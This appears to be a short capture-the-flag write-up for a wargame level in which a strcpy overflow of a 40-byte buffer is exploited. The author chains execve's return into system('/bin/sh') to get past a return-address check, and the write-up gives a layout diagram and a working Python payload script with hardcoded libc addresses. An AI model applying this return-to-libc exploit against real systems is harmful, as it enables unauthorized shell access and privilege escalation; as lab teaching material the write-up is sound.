# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program copys argv[1] to buffer by using strcpy function that does not check boundary.

The protection code makes me to use execve address, not system address.

# Exploitation

I can use execve but my method uses execve's return address.
```
-------------------------------------------------------------------------------------------------------------------------------
| buffer[40] | SFP[4] | RET(execve) | execve's ret(system's address) | system's ret(AAAA) | system's param(/bin/sh's address) |
-------------------------------------------------------------------------------------------------------------------------------
```

This payload can bypass Return Address check and after exit execve function with wrong param, the system function will be executed with param(/bin/sh's address).

# Payload
```python
import os
payload = ""
payload = payload + "A"*44
payload = payload + "\x48\x9d\x0a\x40" # execve's address
payload = payload + "\xe0\x8a\x05\x40" # execve's ret(system's address)
payload = payload + "AAAA" # system's ret
payload = payload + "\xf9\xbf\x0f\x40" # /bin/sh

os.execv("/home/bugbear/giant", ["", payload])
```
